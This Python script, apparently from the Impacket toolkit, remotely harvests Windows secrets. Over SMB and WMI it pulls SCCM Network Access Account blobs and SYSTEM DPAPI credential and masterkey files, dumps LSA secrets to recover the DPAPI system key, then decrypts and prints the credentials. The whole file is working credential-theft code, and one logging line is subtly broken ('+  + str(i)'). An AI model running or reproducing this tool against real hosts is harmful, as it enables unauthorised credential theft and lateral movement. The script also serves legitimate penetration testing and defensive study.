#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#    Automates extraction of DPAPI credentials for the SYSTEM user on a remote host
#
# Authors:
#   Alberto Solino (@agsolino)
#   Clement Lavoillotte (@clavoillotte)
#
from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys
import ntpath
from binascii import unhexlify, hexlify
from io import BytesIO

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target

from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY

from impacket.smbconnection import SMBConnection

from impacket.dpapi import MasterKeyFile, MasterKey, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
from impacket.uuid import bin_to_string

from impacket.examples.secretsdump import RemoteOperations, LSASecrets

from impacket.krb5.keytab import Keytab
try:
    input = raw_input
except NameError:
    pass

class DumpCreds:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__LSASecrets = None
        self.__userkey = options.userkey
        self.__noLMHash = True
        self.__isRemote = True
        self.__doKerberos = options.k
        self.__dumpLSA = (options.userkey is None)
        self.__kdcHost = options.dc_ip
        self.__options = options
        self.key = None
        self.raw_sccm_blobs = []
        self.raw_credentials = {}
        self.raw_masterkeys = {}
        self.masterkeys = {}
        self.get_sccm = options.all or options.sccm
        self.get_creds = options.all or options.creds

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def getDPAPI_SYSTEM(self, secretType, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            userKey = userKey.split(':')[1]
            self.key = unhexlify(userKey[2:])

    def getFileContent(self, share, path, filename):
        content = None
        try:
            fh = BytesIO()
            filepath = ntpath.join(path,filename)
            self.__smbConnection.getFile(share, filepath, fh.write)
            content = fh.getvalue()
            fh.close()
        except:
            return None
        return content

    def addPolicySecret(self, secret):
        if secret.startswith("<PolicySecret"):
            self.raw_sccm_blobs.append(unhexlify(secret[43:-18]))
        else:
            logging.info("Not a PolicySecret, skipping")

    def dump(self):
        if self.get_sccm:
            # get SCCM credentials using WMI
            try:
                namespace = 'root\\ccm\\Policy\\Machine\\RequestedConfig'
                query = 'SELECT NetworkAccessUsername,NetworkAccessPassword FROM CCM_NetworkAccessAccount'
                logging.info("Querying SCCM configuration via WMI")
                dcom = DCOMConnection(self.__remoteHost, self.__username, self.__password, self.__domain, self.__lmhash,
                                                self.__nthash, self.__aesKey, oxidResolver=True,
                                                    doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

                iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                iWbemServices= iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
                if self.__options.rpc_auth_level == 'privacy':
                    iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
                elif self.__options.rpc_auth_level == 'integrity':
                    iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)

                iWbemLevel1Login.RemRelease()

                iEnum = iWbemServices.ExecQuery(query)
                while True:
                    try:
                        pEnum = iEnum.Next(0xffffffff,1)[0]
                        record = pEnum.getProperties()
                        for key in record:
                            if type(record[key]['value']) is list:
                                for item in record[key]['value']:
                                    self.addPolicySecret(item)
                            else:
                                self.addPolicySecret(record[key]['value'])
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback
                            traceback.print_exc()
                        if str(e).find('S_FALSE') < 0:
                            raise
                        else:
                            break
                iEnum.RemRelease()

                iWbemServices.RemRelease()
                dcom.disconnect()
            except Exception as e:
                logging.error(str(e))
                if type(e) is wmi.DCERPCSessionError and e.error_code == 0x8004100e:
                    logging.error("CCM namespace not found, this usually means there is no SCCM configuration on the machine.")
                try:
                    dcom.disconnect()
                except:
                    pass

            if len(self.raw_sccm_blobs) == 0:
                logging.info("No SCCM secrets found")
            else:
                logging.info("Got " + str(len(self.raw_sccm_blobs)) + " SCCM secrets.")

        # retrieve DPAPI decryption keys using SMB (and an LSA Secrets dump if needed)
        try:
            self.__isRemote = True
            bootKey = None
            try:
                try:
                    self.connect()
                except Exception as e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        # SMBConnection failed. That might be because there was no way to log into the
                        # target system. We just have a last resort. Hope we have tickets cached and that they
                        # will work
                        logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                        pass
                    else:
                        raise

                # get SYSTEM credentials (if requested) & masterkeys
                share = 'C$'
                cred_path = '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
                mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
                tid = self.__smbConnection.connectTree(share)

                if self.get_creds:
                    for f in self.__smbConnection.listPath(share, ntpath.join(cred_path,'*')):
                        if f.is_directory() == 0:
                            filename = f.get_longname()
                            logging.info("Credential file found: " + filename)
                            logging.info("Retrieving credential file: " + filename)
                            data = self.getFileContent(share, cred_path, filename)
                            if data:
                                self.raw_credentials[filename] = data
                            else:
                                logging.info("Could not get content of credential file: " + filename + ", skipping")

                    # for each credential, get corresponding masterkey file
                    useless_credentials = []
                    for k,v in self.raw_credentials.items():
                        cred = CredentialFile(v)
                        blob = DPAPI_BLOB(cred['Data'])
                        mkid = bin_to_string(blob['GuidMasterKey'])
                        if mkid not in self.raw_masterkeys:
                            logging.info("Retrieving masterkey file: " + mkid)
                            self.raw_masterkeys[mkid] = self.getFileContent(share, mk_path, mkid)
                        if self.raw_masterkeys[mkid] is None:
                            logging.info("Could not get content of masterkey file: " + mkid + ", skipping")
                            useless_credentials.append(k)
                    for k in useless_credentials:
                        del self.raw_credentials[k]

                # for each SCCM secret, get corresponding masterkey file
                readable_secrets = []
                for v in self.raw_sccm_blobs:
                    blob = DPAPI_BLOB(v)
                    mkid = bin_to_string(blob['GuidMasterKey'])
                    if mkid not in self.raw_masterkeys:
                        logging.info("Retrieving masterkey file: " + mkid)
                        self.raw_masterkeys[mkid] = self.getFileContent(share, mk_path, mkid)
                    if self.raw_masterkeys[mkid] is None:
                        logging.info("Could not get content of masterkey file: " + mkid + ", skipping")
                    else:
                        readable_secrets.append(v)
                self.raw_sccm_blobs = readable_secrets

                # check whether there's something left to decrypt
                if len(self.raw_credentials) == 0 and len(self.raw_sccm_blobs) == 0:
                    logging.info("Nothing to decrypt, quitting")
                    return

                # prepare to dump LSA secrets to get SYSTEM userkey if not provided
                if self.__userkey is None:
                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.enableRegistry()
                    bootKey = self.__remoteOps.getBootKey()
                else:
                    self.key = unhexlify(self.__userkey[2:])
            except Exception as e:
                self.__dumpLSA = False
                logging.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract LSA
            if self.__dumpLSA:
                try:
                    SECURITYFileName = self.__remoteOps.saveSECURITY()
                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                    isRemote=self.__isRemote, history=False,
                                                    perSecretCallback = self.getDPAPI_SYSTEM)
                    self.__LSASecrets.dumpSecrets()
                    logging.info('dpapi_userkey: 0x' + hexlify(self.key).decode('utf-8'))
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('LSA hashes extraction failed: %s' % str(e))
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            try:
                self.cleanup()
            except:
                pass

        # decrypt collected secrets & creds
        if self.key is None:
            logging.error("Could not get SYSTEM userkey")
            return
        for k,v in self.raw_masterkeys.items():
            if v is None:
                self.masterkeys[k] = None
                continue
            data = v
            mkf = MasterKeyFile(data)
            data = data[len(mkf):]
            if not mkf['MasterKeyLen'] > 0:
                logging.error("Masterkey file " + k + " does not contain a masterkey")
                continue
            mk = MasterKey(data[:mkf['MasterKeyLen']])
            data = data[len(mk):]
            decryptedKey = mk.decrypt(self.key)
            if not decryptedKey:
                logging.error("Could not decrypt masterkey " + k)
                continue
            logging.info("Decrypted masterkey " + k + ": 0x" + hexlify(decryptedKey).decode('utf-8'))
            self.masterkeys[k] = decryptedKey
        i = -1
        for v in self.raw_sccm_blobs:
            i += 1
            blob = DPAPI_BLOB(v)
            mkid = bin_to_string(blob['GuidMasterKey'])
            key = self.masterkeys.get(mkid, None)
            if key is None:
                logging.info("Could not decrypt masterkey " + mkid + ", skipping SCCM secret " + str(i))
                continue
            logging.info("Decrypting SCCM secret " + str(i))
            decrypted = blob.decrypt(key)
            if decrypted is not None:
                print(decrypted.decode('utf-16le'))
            else:
                logging.error("Could not decrypt SCCM secret " +  + str(i))
        for k,v in self.raw_credentials.items():
            cred = CredentialFile(v)
            blob = DPAPI_BLOB(cred['Data'])
            mkid = bin_to_string(blob['GuidMasterKey'])
            key = self.masterkeys.get(mkid, None)
            if key is None:
                logging.info("Could not decrypt masterkey " + mkid + ", skipping credential " + k)
                continue
            logging.info("Decrypting credential " + k)
            decrypted = blob.decrypt(key)
            if decrypted is not None:
                creds = CREDENTIAL_BLOB(decrypted)
                creds.dump()
            else:
                logging.error("Could not decrypt credential file " + k)


    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs remote extraction of SYSTEM DPAPI credentials and SCCM client secrets.")

    parser.add_argument('-creds', action='store_true', help='Extract SYSTEM user DPAPI credentials (default: all)')
    parser.add_argument('-sccm', action='store_true', help='Extract SCCM client credentials (default: all)')
    parser.add_argument('-userkey', action='store', help='dpapi_userkey for SYSTEM (e.g. if previously dumped using secretsdump). '
                             'If not provided an LSA secrets dump will be performed to retrieve it.')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
                        'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    group.add_argument('-rpc-auth-level', choices=['integrity', 'privacy','default'], nargs='?', default='default',
                       help='default, integrity (RPC_C_AUTHN_LEVEL_PKT_INTEGRITY) or privacy '
                            '(RPC_C_AUTHN_LEVEL_PKT_PRIVACY). For example CIM path "root/MSCluster" would require '
                            'privacy level by default)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    options.all = (options.sccm is False and options.creds is False)

    dumper = DumpCreds(address, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
